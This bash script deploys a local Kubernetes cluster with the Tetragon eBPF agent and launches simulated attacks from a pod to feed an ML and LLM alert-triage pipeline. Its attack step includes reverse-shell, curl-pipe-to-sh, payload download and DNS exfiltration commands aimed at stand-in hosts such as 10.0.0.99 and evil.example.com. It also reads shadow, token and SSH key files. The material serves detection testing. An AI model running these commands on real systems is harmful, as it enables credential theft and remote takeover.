#!/bin/bash
set -e

# ── Virtual Environment ──────────────────────────────────────────
if [ -f ".venv/bin/activate" ]; then
    source .venv/bin/activate
fi

echo "============================================================"
echo "  Sentinel-Core: Real eBPF Security Pipeline"
echo "============================================================"

# ── 1. Hermetic Toolchain ────────────────────────────────────────
mkdir -p bin
export PATH="$PWD/bin:$PATH"

echo "[1/9] Checking tooling dependencies..."
if ! docker ps &>/dev/null; then
    echo "  ✖ Error: Docker is not running or accessible. Please start Docker first."
    exit 1
fi
if ! command -v kind &>/dev/null; then
    echo "  ↳ Downloading kind..."
    curl -sLo ./bin/kind https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
    chmod +x ./bin/kind
fi
if ! command -v kubectl &>/dev/null; then
    echo "  ↳ Downloading kubectl..."
    curl -sLo ./bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl"
    chmod +x ./bin/kubectl
fi
if ! command -v helm &>/dev/null; then
    echo "  ↳ Downloading helm..."
    curl -fsSL -o /tmp/get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
    chmod 700 /tmp/get_helm.sh
    HELM_INSTALL_DIR=$PWD/bin USE_SUDO="false" /tmp/get_helm.sh >/dev/null 2>&1 || true
    rm -f /tmp/get_helm.sh
fi
echo "  ✓ kind=$(kind --version 2>/dev/null | awk '{print $3}')"
echo "  ✓ kubectl=$(kubectl version --client -o json 2>/dev/null | python3 -c 'import sys,json;print(json.load(sys.stdin)["clientVersion"]["gitVersion"])' 2>/dev/null || echo 'ok')"
echo "  ✓ helm=$(helm version --short 2>/dev/null)"

CLUSTER_NAME="sentinel-cluster"

# ── 2. Kubernetes Cluster ────────────────────────────────────────
echo ""
echo "[2/9] Provisioning Kubernetes cluster..."

mkdir -p /tmp
if kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
    echo "  ↳ Cluster '${CLUSTER_NAME}' exists, checking health..."
    # Always update kubeconfig in case the port mapping changed
    kind export kubeconfig --name "${CLUSTER_NAME}" >/dev/null 2>&1
    
    if ! kubectl cluster-info &>/dev/null; then
        echo "  ⚠ Cluster is unreachable (EOF/Reset). Force-recreating..."
        kind delete cluster --name "${CLUSTER_NAME}"
        CLUSTER_EXISTS=false
    else
        echo "  ✓ Cluster is healthy and reachable"
        CLUSTER_EXISTS=true
    fi
else
    CLUSTER_EXISTS=false
fi

if [ "$CLUSTER_EXISTS" = false ]; then
    echo "  ↳ Creating kind cluster with kernel debug/trace mounts..."
    cat > /tmp/kind-config.yaml <<'KINDEOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  extraMounts:
  - hostPath: /sys/kernel/debug
    containerPath: /sys/kernel/debug
    propagation: Bidirectional
  - hostPath: /sys/kernel/tracing
    containerPath: /sys/kernel/tracing
    propagation: Bidirectional
KINDEOF
    kind create cluster --name "${CLUSTER_NAME}" --config /tmp/kind-config.yaml --wait 5m
    rm -f /tmp/kind-config.yaml
    kind export kubeconfig --name "${CLUSTER_NAME}"
fi

# Mount tracefs/debugfs inside the Kind node (required for eBPF on Arch)
echo "  ↳ Mounting kernel trace filesystems inside node..."
docker exec ${CLUSTER_NAME}-control-plane \
    mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null || true
docker exec ${CLUSTER_NAME}-control-plane \
    mount -t debugfs debugfs /sys/kernel/debug 2>/dev/null || true

# ── 3. Tetragon eBPF Agent ───────────────────────────────────────
echo ""
echo "[3/9] Deploying Tetragon eBPF agent..."
if helm list -n kube-system 2>/dev/null | grep -q tetragon; then
    echo "  ✓ Tetragon already installed"
else
    echo "  ↳ Installing via Helm with tracefs/debugfs mounts..."
    helm repo add cilium https://helm.cilium.io >/dev/null 2>&1
    helm repo update >/dev/null 2>&1
    helm install tetragon cilium/tetragon -n kube-system -f tetragon-values.yaml --wait --timeout=180s
fi

echo "  ↳ Waiting for Tetragon readiness..."
kubectl wait --for=condition=ready pod \
    -l app.kubernetes.io/name=tetragon \
    -n kube-system --timeout=180s

echo "  ↳ Applying TracingPolicy..."
kubectl apply -f sentinel-policy.yaml

echo "  ✓ Tetragon is LIVE and monitoring"

# ── 4. Deploy Real Attack Pod ────────────────────────────────────
echo ""
echo "[4/9] Deploying attacker workload into cluster..."
kubectl delete pod attacker-pod --ignore-not-found=true >/dev/null 2>&1
kubectl run attacker-pod \
    --image=alpine/curl:latest \
    --restart=Never \
    -- sleep 3600
echo "  ↳ Waiting for attacker pod..."
kubectl wait --for=condition=ready pod attacker-pod --timeout=60s
echo "  ✓ Attacker pod is LIVE in namespace: default"

# ── 5. Execute Real Attacks ──────────────────────────────────────
echo ""
echo "[5/9] Executing REAL attack commands inside the cluster..."

# ── HIGH SEVERITY (TP-grade): shell parent + sensitive paths + network + high-risk binaries ──
echo "  ↳ Attack 1: Credential theft via shell (shadow + passwd)"
kubectl exec attacker-pod -- sh -c "cat /etc/shadow" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "cat /etc/passwd" 2>/dev/null || true

echo "  ↳ Attack 2: Kubernetes secret exfiltration"
kubectl exec attacker-pod -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" 2>/dev/null || true

echo "  ↳ Attack 3: Reverse shell attempts with network targets"
kubectl exec attacker-pod -- sh -c "nc -e /bin/sh 10.0.0.99 4444" 2>/dev/null &
kubectl exec attacker-pod -- sh -c "curl http://10.0.0.99:8888/shell.sh | sh" 2>/dev/null &

echo "  ↳ Attack 4: Download + execute remote payload"
kubectl exec attacker-pod -- sh -c "curl -sk https://evil.example.com/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "wget -q http://10.0.0.99:9090/backdoor -O /tmp/backdoor" 2>/dev/null || true

echo "  ↳ Attack 5: Network port scanning"
kubectl exec attacker-pod -- sh -c "nc -zw1 10.96.0.1 443" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "nc -zw1 10.96.0.1 8443" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "nc -zw1 10.96.0.10 53" 2>/dev/null || true

echo "  ↳ Attack 6: SSH key theft + proc recon"
kubectl exec attacker-pod -- sh -c "cat /root/.ssh/id_rsa" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "ls -la /proc/1/root/" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "find / -perm -4000 2>/dev/null | head -5" 2>/dev/null || true

# ── MEDIUM SEVERITY (BP-grade): some risk signals but less critical ──
echo "  ↳ Attack 7: Process + user enumeration"
kubectl exec attacker-pod -- sh -c "ps aux && whoami && id" 2>/dev/null || true

echo "  ↳ Attack 8: DNS exfiltration"
kubectl exec attacker-pod -- sh -c "nslookup data.evil.example.com" 2>/dev/null || true
kubectl exec attacker-pod -- sh -c "wget -q https://example.com -O /dev/null" 2>/dev/null || true

# ── LOW SEVERITY (FP-grade): baseline normal activity ──
echo "  ↳ Attack 9: Benign commands (baseline)"
kubectl exec attacker-pod -- ls /tmp 2>/dev/null || true
kubectl exec attacker-pod -- whoami 2>/dev/null || true

echo "  ✓ All attack commands executed — mixed TP/BP/FP severity"

# ── 6. Redis ─────────────────────────────────────────────────────
echo ""
echo "[6/9] Starting Redis on port 6379..."
if docker ps --format '{{.Names}}' 2>/dev/null | grep -q '^sentinel-redis$'; then
    echo "  ✓ Redis container already running"
elif docker ps -a --format '{{.Names}}' 2>/dev/null | grep -q '^sentinel-redis$'; then
    echo "  ↳ Restarting existing Redis container..."
    docker start sentinel-redis >/dev/null
    echo "  ✓ Redis container restarted"
else
    echo "  ↳ Starting Redis via Docker..."
    docker run -d --name sentinel-redis -p 6379:6379 redis:7-alpine >/dev/null
    echo "  ✓ Redis container started"
fi
# Wait for Redis to accept connections
for i in $(seq 1 10); do
    if docker exec sentinel-redis redis-cli ping 2>/dev/null | grep -q PONG; then
        echo "  ✓ Redis is ready"
        break
    fi
    sleep 1
done

# ── 7. Stream + Analyze ──────────────────────────────────────────
echo ""
echo "[7/9] Starting Sentinel-Core ML + RAG Pipeline..."
export PYTHONPATH="$PWD:$PYTHONPATH"

cat << 'PYEOF' > _sentinel_live.py
import sys
import time
import json
import logging
import threading
from pathlib import Path

import uvicorn
from forwarder.api import app as fastapi_app
from forwarder.api import set_redis_status, set_ml_triage
from forwarder.config import Config
from forwarder.main import process_line
from forwarder.ml_triage import MLTriage
from forwarder.publisher import EventPublisher
import forwarder.main

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s │ %(name)-22s │ %(levelname)-5s │ %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("sentinel.live")

config = Config()

# API server
def run_api():
    uvicorn.run(fastapi_app, host="0.0.0.0", port=8081, log_level="warning")
threading.Thread(target=run_api, daemon=True).start()
time.sleep(2)

# ML Triage
ml = MLTriage(
    model_path=Path(config.ML_MODEL_PATH),
    feature_list_path=Path(config.FEATURE_LIST_PATH)
)
set_ml_triage(ml)
forwarder.main._ml_triage = ml

# Publisher
pub = EventPublisher(config)
set_redis_status(pub.is_connected)

# Try to trigger RAG + Gemini orchestration for high-severity events
try:
    from orchestrator import analyze_alert, ORCHESTRATOR_AVAILABLE
    rag_enabled = ORCHESTRATOR_AVAILABLE
    if rag_enabled:
        logger.info("🧠 RAG + Gemini orchestrator is ONLINE")
    else:
        logger.warning("⚠️  Orchestrator offline (missing API keys). ML triage only.")
except ImportError:
    rag_enabled = False
    logger.warning("⚠️  Orchestrator module not available")

print()
print("🚀 Sentinel API: http://127.0.0.1:8081")
print("📡 Processing REAL eBPF telemetry from Kubernetes cluster...")
print("   Press Ctrl+C to stop")
print()

event_count = 0
try:
    for line in sys.stdin:
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            sentinel_event = process_line(line, pub)
            if sentinel_event:
                event_count += 1
                triage = sentinel_event.get("triage", {})
                grade = triage.get("grade", "UNKNOWN")
                score = float(triage.get("confidence", 0.0))

                # For TP/BP events, run through the full orchestrator (RAG + Gemini)
                if rag_enabled and grade in ("TP", "BP") and event_count <= 20:
                    try:
                        raw = json.loads(line)
                        result = analyze_alert(
                            raw_event=raw,
                            guide_score=score,
                            guide_grade=grade,
                            stream=False
                        )
                        if result.get("final_report"):
                            logger.info("📋 ORCHESTRATOR REPORT:\n%s", result["final_report"][:500])
                        if result.get("yaml_fix"):
                            logger.info("🔧 YAML FIX:\n%s", result["yaml_fix"][:300])
                    except Exception as orch_err:
                        logger.warning("Orchestrator error: %s", orch_err)

        except Exception as e:
            logger.error("Event decode error: %s", e)

except KeyboardInterrupt:
    logger.info("Pipeline terminated. Processed %d events.", event_count)
    pub.close()
    sys.exit(0)
PYEOF

echo "============================================================"
echo "  STREAM ACTIVE — Real eBPF events flowing"
echo "============================================================"

# ── 8. Start Dashboard API (port 8080) ───────────────────────────
echo ""
echo "[8/9] Starting Dashboard API on port 8080..."
export REMEDIATION_DRY_RUN="${REMEDIATION_DRY_RUN:-false}"
export REMEDIATION_AUTONOMY_MODE="${REMEDIATION_AUTONOMY_MODE:-autonomous}"
export REMEDIATION_SIGKILL_THRESHOLD="${REMEDIATION_SIGKILL_THRESHOLD:-0.85}"
export REMEDIATION_YAML_THRESHOLD="${REMEDIATION_YAML_THRESHOLD:-0.75}"
python3 dashboard_api.py &
DASHBOARD_API_PID=$!
echo "  ✓ Dashboard API PID: $DASHBOARD_API_PID"
sleep 2

# ── 9. Start Frontend Dashboard (port 5173) ──────────────────────
echo ""
echo "[9/9] Starting Frontend Dashboard on port 5173..."
if [ -f dashboard/package.json ]; then
    cd dashboard
    if [ ! -d node_modules ]; then
        echo "  ↳ Installing npm dependencies..."
        npm install
    fi
    npm run dev &
    FRONTEND_PID=$!
    cd ..
    echo "  ✓ Frontend PID: $FRONTEND_PID"
else
    echo "  ⚠ No dashboard/package.json found, skipping frontend"
fi

echo ""
echo "============================================================"
echo "  SENTINEL-CORE FULL STACK RUNNING"
echo "============================================================"
echo "  Frontend Dashboard:  http://localhost:5173"
echo "  Dashboard API:       http://localhost:8080"
echo "  Forwarder API:       http://localhost:8081"
echo "  Redis:               localhost:6379"
echo "============================================================"
echo ""
echo "  Streaming eBPF events from cluster..."
echo "  Press Ctrl+C to stop all services"
echo ""

# Cleanup on exit
cleanup() {
    echo ""
    echo "Shutting down Sentinel-Core services..."
    kill $DASHBOARD_API_PID $FRONTEND_PID 2>/dev/null
    docker stop sentinel-redis >/dev/null 2>&1 || true
    exit 0
}
trap cleanup INT TERM

# Start the eBPF event stream (this blocks)
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon \
    -c export-stdout -f --since=1m | python3 _sentinel_live.py
